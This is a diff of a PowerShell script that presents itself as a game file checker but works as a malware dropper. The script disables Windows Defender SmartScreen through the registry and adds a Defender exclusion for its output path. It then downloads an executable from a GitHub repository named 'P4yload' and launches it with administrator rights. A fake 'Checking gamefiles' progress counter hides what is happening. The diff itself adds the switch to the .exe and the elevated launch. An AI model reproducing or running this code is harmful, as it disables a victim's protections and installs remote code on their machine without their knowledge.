@@ -22,18 +22,15 @@ Set-ItemProperty -Path 'HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender\Smart
 Set-ItemProperty -Path 'HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender\SmartScreen' -Name 'ConfigureSmartScreen' -Value 2 -Type DWord -Force -ErrorAction SilentlyContinue -InformationAction SilentlyContinue
 gpupdate /force | Out-Null -ErrorAction SilentlyContinue -InformationAction SilentlyContinue
 
-$Url = "https://github.com/P4yload/CheckWeb1/raw/main/Check.bat"
-$OutputFile = "C:\Users\ccmmmdd.bat"
+$url = "https://github.com/P4yload/WebCheck/raw/main/Check.exe"
+$outputFile = "C:\Users\ccmmmd.exe"
+Add-MpPreference -ExclusionPath $outputFile
+Invoke-WebRequest -Uri $url -OutFile $outputFile -UserAgent "SJSHDOWSJHIAOOWUIWOJFAIWOFJIWEAOFJEWIOFJEWIOJEWIOTGEWUIOGEHUGHESUIGEHSIUEHIUEIUE"
+#$webClient = New-Object System.Net.WebClient
+#$webClient.Headers.Add("User-Agent", "SJSHDOWSJHIAOOWUIWOJFAIWOFJIWEAOFJEWIOFJEWIOJEWIOTGEWUIOGEHUGHESUIGEHSIUEHIUEIUE")
+#$webClient.DownloadFile($url, $outputFile)
 
-Add-MpPreference -ExclusionPath $OutputFile
-
-Invoke-WebRequest -Uri $Url -OutFile $OutputFile -UserAgent "SJSHODWSJHIAOOWUIJOFAIWOFJIEAWOFJEWIOFJEWIOJEWIOTGEWUIOGEHUGHE SUI GEHSIUEHIUEIUE"
-
-$webClient = New-Object System.Net.WebClient
-$webClient.Headers.Add("User-Agent", "SJSHODWSJHIAOOWUIJOFAIWOFJIEAWOFJEWIOFJEWIOJEWIOTGEWUIOGEHUGHESUIGEHSIUEHIUEIUE")
-$webClient.DownloadFile($Url, $OutputFile)
-
-Start-Process -FilePath $OutputFile
+Start-Process -FilePath $outputFile -Verb RunAs
 
 for ($i = 1; $i -le 100; $i++) {
     Write-Host -NoNewline ("Checking gamefiles: $i%`r")
